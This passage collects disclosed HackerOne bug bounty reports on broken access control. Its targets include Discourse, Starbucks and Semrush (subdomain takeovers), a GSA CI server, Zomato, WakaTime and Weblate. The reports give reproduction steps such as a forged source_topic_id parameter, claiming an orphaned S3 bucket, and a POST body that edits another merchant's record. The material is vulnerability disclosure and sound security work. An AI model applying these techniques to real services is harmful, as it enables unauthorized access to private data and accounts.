When pasting a link in a reply, if this link happens to be a link to another topic on Discourse a small preview is shown which includes the topic content or the post content where the link is pointing to. Also there are some protections in place to make sure that the user can view the linked content, the said protections can be bypassed by adding a query string parameter to the link containing the value 
```
?source_topic_id={victim-topic-id}
```

## Steps to reproduce
1. Login as an administrator to Discourse and create a topic which can only be viewed by the staff.
2. Copy the topic's id from the topic's page. the topic id can be found by browsing the topic and then copying the number in the end of the url (`http://localhost:4000/t/{topic-name}/{topic-id}`)
3. Login with a non-admin user.
4. Go to any topic you have access to, and type in the following reply:
```
http://localhost:80/t/blablabla/?source_topic_id=29
```
please note that the port should 80 or 443 even if the url of your local installation is a different (probably some software bug)
5. Wait for the preview to load and see that you can see topic's content.

## Root cause
The following piece of code determines if the logged-in user is capable of viewing the post/topic :

```
        def can_see_post?(post, source_topic)
          return false if post.nil? || post.hidden || post.trashed? || post.topic.nil?
          Guardian.new.can_see_post?(post) || same_category?(post.topic.category, source_topic)
        end

        def can_see_topic?(topic, source_topic)
          return false if topic.nil? || topic.trashed? || topic.private_message?
          Guardian.new.can_see_topic?(topic) || same_category?(topic.category, source_topic)
        end
```
as can be seen here: https://github.com/discourse/discourse/blob/master/lib/onebox/engine/discourse_local_onebox.rb#L113

However, the source_topic parameter is controlled directly by user input:
```
source_topic_id = @url[/[&?]source_topic_id=(\d+)/, 1].to_i
```
as can be seen here: 
https://github.com/discourse/discourse/blob/master/lib/onebox/engine/discourse_local_onebox.rb#L47
So if we pass in the same topic id as the one we are trying to view, basically the function same_category will always return true, effectively bypassing any protection in place.

## Impact

An attacker will be able to access all private topics and posts on Discourse.

---

### [Subdomain takeover on developer.openapi.starbucks.com](https://hackerone.com/reports/275714)

- **Report ID:** `275714`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Starbucks
- **Reporter:** @dpgribkov
- **Bounty:** - usd
- **Disclosed:** 2018-02-17T16:34:37.814Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,

### Summary: 
Subdomain `developer.openapi.starbucks.com` is vulnerable to subdomain takeover via Mashery service. The reason why it's worked unfortunately not fully clear to me.

### Details:
Doing my recent research on starbucks.com subdomains, I stumbled upon http://developer.openapi.starbucks.com/ The server returned 200 response with the following {F227581} The `Server` header of HTTP responce was `Mashery Proxy` so it gave me an idea, that I should go and try register an trial account at https://www.mashery.com/

After registering an account and confirming it, I got access to the dashboard. Under the `Portal Settings` menu there was an option to add your own domain name. I added developer.openapi.starbucks.com as my domain and I get no error. After I went to the http://developer.openapi.starbucks.com/ and saw welcome page {F227586} which gave me understanding that I can serve my own content under developer.openapi.starbucks.com

### PoC:
I added simple js code to the Welcome page `alert(document.domain)` for this proof-of-concept.
To confirm it just click this link http://developer.openapi.starbucks.com/

### Impact:
As I can serve my own content without any restrictions, with this webpage I can set up a campaign to steal user cookie sessions, or use it to steal credentials, or for phishing purposes. 

Please let me know, if you need more information!

Thanks,
Danil

---

### [CI for [example.gov] can be logged in and accessible](https://hackerone.com/reports/311289)

- **Report ID:** `311289`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** GSA Bounty
- **Reporter:** @kunal94
- **Bounty:** 2000 usd
- **Disclosed:** 2018-02-07T01:59:55.627Z
- **CVE(s):** -

**Summary (team):**

When anyone searched a public search engine for `inurl:example.gov` (where `example.gov` was one of the URLs in the TTS Bug Bounty scope), the search results included a CI/CD build results URL. When anyone visited that build results page, they were faced with a login page, but if they clicked "log in", no authentication was required. This exposed the CI/CD interface for a production component, including a set of deployment credentials. It would have been possible to leverage these credentials to get other privileges.

---

### [subdomain takeover at news-static.semrush.com](https://hackerone.com/reports/294201)

- **Report ID:** `294201`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Semrush
- **Reporter:** @0ways
- **Bounty:** - usd
- **Disclosed:** 2018-01-10T13:08:29.070Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** The subdomain news-static.semrush.com can be taken over by attackers and abuse it for further attacks (Phishing, XSS Cross origin, malware, etc..).

**Description:** The subdomain news-static.semrush.com was pointed using CNAME to Amazon S3, but no bucket with that name was registered. This meant that anyone could sign up for Amazon S3, claim the bucket as their own and then serve content on news-static.semrush.com

**Browsers Verified In:**
  * Google Chrome v62.0.3202.94 
  * FireFox ESR v52.5.0

**Steps To Reproduce:** 
  1. Open AWS account
  2. Create s3 bucket and claim the subdomain news-static.semrush.com
  3. upload poc.html file to the bucket

**Supporting Material/References:**

```
$ dig A news-static.semrush.com @8.8.8.8

; <<>> DiG 9.8.3-P1 <<>> A news-static.semrush.com @8.8.8.8
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 35678
;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;news-static.semrush.com.	IN	A

;; ANSWER SECTION:
news-static.semrush.com. 59	IN	CNAME	s3.amazonaws.com.
s3.amazonaws.com.	3459	IN	CNAME	s3-1.amazonaws.com.
s3-1.amazonaws.com.	4	IN	A	52.216.21.165
```

**POC**
http://news-static.semrush.com/POC_2313521212.html

This means that nobody else can claim the bucket and add content.

**Mitigation/Fix** 
I have claimed the bucket on my account so no one can claimed it before I release it.
Remove the news-static.semrush.com DNS entry. Alternatively, if you wish to use news-static.semrush.com with S3, tell me in a comment and I will remove the bucket from my Amazon account.

## Impact

The attacker will own the subdomain and can do whatever he want with it, such as Phishing, XSS that can affect all *.semrush.com to bypass cross origin policy and upload malwares. etc..

---

### [Unauthorized update of merchants' information via /php/merchant_details.php](https://hackerone.com/reports/255651)

- **Report ID:** `255651`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Eternal
- **Reporter:** @adibou
- **Bounty:** - usd
- **Disclosed:** 2017-09-19T06:14:42.259Z
- **CVE(s):** -

**Vulnerability Information:**

Hello!

I discovered an interesting file : 
`https://www.zomato.com/php/merchant_details.php`

If I add in post content :
`action=update-merchant&merchant_id=95292&type=1&email=update@hotmail.fr&contact=update@hotmail.fr&name=update`

With the report #255648, I was able to create a merchant, I should use this merchant to provide a screenshot like in a real situation.


I'm also able to change :
`address, pincode, city, email, phone tan_number, bank account name, company_id, payu_id, contact, restaurants` and more...


An attacker would change the mail to receive confidential mails it may can be leading to an merchant takeover if you use the mail to bound it with the account of the user. I couldn't try this scenario due to your rules about users data.

Do you have a test merchant_id i can play with to test that before you resolve the report?

Screenshot : updatehttp.png

If you have any questions...
nbsp

---

### [Bypass OTP verification when placing Order](https://hackerone.com/reports/247158)

- **Report ID:** `247158`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Eternal
- **Reporter:** @madrobot
- **Bounty:** - usd
- **Disclosed:** 2017-08-09T07:20:49.840Z
- **CVE(s):** -

**Summary (team):**

###Description
Attacker was able to bypass the OTP verification needed while placing an order with a restaurant.

---

### [Session Duplication due to Broken Access Control](https://hackerone.com/reports/247225)

- **Report ID:** `247225`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** WakaTime
- **Reporter:** @anurag98
- **Bounty:** - usd
- **Disclosed:** 2017-07-10T07:33:51.921Z
- **CVE(s):** -

**Vulnerability Information:**

Due to improper validation of user before generating an API-KEY and improper measures taken at the time of password reset, it is possible to generate a parallel session at the attacker's end.

Proof of concept video is attached to confirm the vulnerability and to demonstrate the Impact of this _logical_ bug.

Steps to Reproduce
=============
Attacker
---------
- Create an account with victims email.
- Download the coding platforms and get API-KEY.
- He can code from the platforms using the victims API-key.

Victim
-------
- User fails to create an account, due to email already registered and does a password reset.
- Downloads the coding platform and get API-KEY.
- He codes using API-KEY.

It is possible for the Attacker and Victim, for coding at the same time, which will be shown at the dashboard. Attacker can reduce the difficulty and can damage the reputation of the coder.

 Impact
=====

__Attacker can brute-force email and register multiple account on wakatime to get API-Key of many users.__
 
Improper rank calculation.

Session duplication by the attacker

---

### [Improper access control when an added email address is deleted from authentication](https://hackerone.com/reports/223434)

- **Report ID:** `223434`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Weblate
- **Reporter:** @h1bountyoverflow
- **Bounty:** - usd
- **Disclosed:** 2017-05-17T14:07:28.760Z
- **CVE(s):** -

**Vulnerability Information:**

Hi team,

There is improper access control kind of vulnerability present in your web application.


Steps to reproduce:

1. Create an account.
2.You will recevie a link on email about confrimation.
2. Login into it and add another email address in authentication tab and You will recevie a link on the new email about confrimation.
3.Remove the the any email address from it authentication tab. (Suppose your old email address got lost or hacked).

Now suppose I removed old email address from authentication tab because i doubt the my old email id got hacked.

Logically when user click on the link recived in the step 2 the user should not be allowed to enter in the application because we have removed the email from authentication tab.

When attacker click on the old link recieved in the step 2 will be able to login into the application and the old email id will be automatically added to authentication tab in that account even the we have alredy removed that email address from our account.


Please let me know if anything more is required .!

---
